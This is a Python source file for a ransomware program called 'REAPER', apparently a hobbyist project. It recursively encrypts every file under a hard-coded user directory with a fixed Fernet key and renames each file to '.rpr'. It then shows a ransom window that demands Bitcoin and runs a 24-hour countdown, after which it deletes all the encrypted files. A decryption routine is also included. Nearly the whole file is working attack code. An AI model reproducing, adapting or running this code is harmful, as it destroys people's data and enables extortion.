# The reaper ransomware 8========D
from cryptography.fernet import Fernet
import os,sys,json,time
from tkinter import *

# Variables
DIR = "C:/Users/krist/Documents/beatmaker"
dirs = []
COLORS = {
  "hacker_green": "\033[1;32;40m",
  "red": "\033[1;31;40m",
  "white":"\033[1;37;40m",
}
banner = f"""
{COLORS["hacker_green"]}
 /$$$$$$$                                                   
| $$__  $$                                                  
| $$  \ $$  /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$ 
| $$$$$$$/ /$$__  $$ |____  $$ /$$__  $$ /$$__  $$ /$$__  $$
| $$__  $$| $$$$$$$$  /$$$$$$$| $$  \ $$| $$$$$$$$| $$  \__/
| $$  \ $$| $$_____/ /$$__  $$| $$  | $$| $$_____/| $$      
| $$  | $$|  $$$$$$$|  $$$$$$$| $$$$$$$/|  $$$$$$$| $$      
|__/  |__/ \_______/ \_______/| $$____/  \_______/|__/      
                              | $$                          
                              | $$                          
                              |__/                          
{COLORS["white"]}"""
RANSOM_TEXT = """ 
This is the REAPER ransomware.

Pay for the ransom to be removed.
The payment must be in Bitcoin.
Once you paid all files will be back to normal.
If instructions are not followed all files will be deleted.

Click on 'Pay' and follow the instructions.
"""

# The file rewriting class
class TakeOver():
  def __init__(self):
    print(banner)
    # Encrypt file
    self.key = b"5sj-M2aX4rfmXd3GDoCJv9u-3Rtfvlz2BZpctmfdx6Q="
    self.fernet = Fernet(self.key) 
    self.file_data = {}
    #The DIR to start with
    self.dir = DIR
    self.destruct(self.dir)

  # Taking over the files
  def destruct(self,directory):
    for i in os.listdir(directory):
      PATH = f"{directory}/{i}"
      #Check for dir
      if os.path.isdir(PATH):
        self.destruct(PATH)
        continue
      # Get file content
      o_f = open(PATH,"rb")
      content = o_f.read()
      o_f.close()
      # Change file ext
      ext = '.' + os.path.realpath(PATH).split('.')[-1:][0]
      if ext == ".rpr":
        print(f"{COLORS['red']}{i} is already encrypted{COLORS['white']}")
      print(f"Attacking: {PATH}")
      self.rpr_file = i.replace(ext, '.rpr')
      ENC_FILE = f"{directory}/{self.rpr_file}"
      try:
        os.rename(PATH, ENC_FILE)
      except FileExistsError:
        pass
      try:
        # Encrypt content of the file
        file = open(ENC_FILE, 'wb')
        file.write(self.fernet.encrypt(content))
        file.close()
      except PermissionError:
        pass
      # Noting the encrypted files in a json format
      self.file_data[str(ENC_FILE)] = ext
      with open('ext.json', 'w') as a:
        json.dump(self.file_data, a)
     
# Decrypt files
class TakeBack():
  def __init__(self):
    print(banner)
    # Get encryption key
    self.key = b"5sj-M2aX4rfmXd3GDoCJv9u-3Rtfvlz2BZpctmfdx6Q="
    self.fernet = Fernet(self.key)
    with open("ext.json") as files:
      self.ENC_FILES = json.load(files)
    for i in self.ENC_FILES:
      # Put old extension back to the file
      ext = '.' + os.path.realpath(i).split('.')[-1:][0]
      if ext != ".rpr":
        print(f"{COLORS['red']}{i} is not encrypted{COLORS['white']}")
        continue
      self.o_file = i.replace(ext, f'{self.ENC_FILES[i]}')
      print(f"Restoring: {i}")
      # Get file content
      o_f = open(i, "rb")
      content = o_f.read()
      o_f.close()
      try:
        # Decrypt the content of the file
        file = open(self.o_file, 'wb')
        file.write(self.fernet.decrypt(content))
        file.close()
        #remove encrypted files
        os.remove(i)
      except PermissionError:
        pass
    print("Files are back to normal, REAPER is quitting...")
    os.remove("ext.json")

# Class for the countdown timer window
class TimerWindow():
  def __init__(self): 
    # Max time to pay ransom
    self.secs = 86400
    # Window
    self.root = Tk()
    self.root.resizable(False,False)
    self.root.geometry("700x700")
    self.root.title("REAPER - COUNTDOWN")
    self.root.configure(bg="black")
    # Reaper text
    rpr_label = Label(self.root, text="\nREAPER", fg="#00FF00",bg="black", font=("Courier", 60,))
    rpr_label.pack()
    # Countdown timer
    self.c_time = StringVar()
    self.c_time.set(self.secs)
    self.timer = Label(self.root, textvariable=self.c_time,bg="black", fg="#00FF00", font=("Courier", 25))
    self.timer.pack()
    # Bitcoin button
    pay_btc_btn = Button(self.root, text="Pay", fg="#00FF00",bg="#404040", font=("Courier", 20))
    pay_btc_btn .pack()
    # Explanation
    exp = Label(self.root, text=RANSOM_TEXT, fg="#00FF00",bg="black", font=("Courier", 12,), anchor='center')
    exp.pack()

  # Method to decrease timer
  def decrease_time(self):
    if self.secs == 0:
      self.delete_all_files()
    else:
      self.secs -= 1
      self.time_left = f"Time left:\n{self.secs//3600}:{self.secs%3600//60}:{self.secs%3600%60}\n"
      self.c_time.set(self.time_left)
      self.root.after(1000, self.decrease_time)

  # Method to delete all files
  def delete_all_files(self):
    print(f"{COLORS['red']}No ransom was paid, deleting files...{COLORS['white']}")
    with open("ext.json") as files:
      self.files = json.load(files)
    for i in self.files:
      os.remove(i)
      print(f"Deleting: {i}")
    os.remove("ext.json")
    sys.exit()

if sys.argv[1] == "-t":
  REAPER = TakeOver()
elif sys.argv[1] == "-r":
  TAKER = TakeBack()
else:
  t = TimerWindow()
  t.decrease_time()
  t.root.mainloop()
  print("Wrong parameters...")
  #sys.exit()
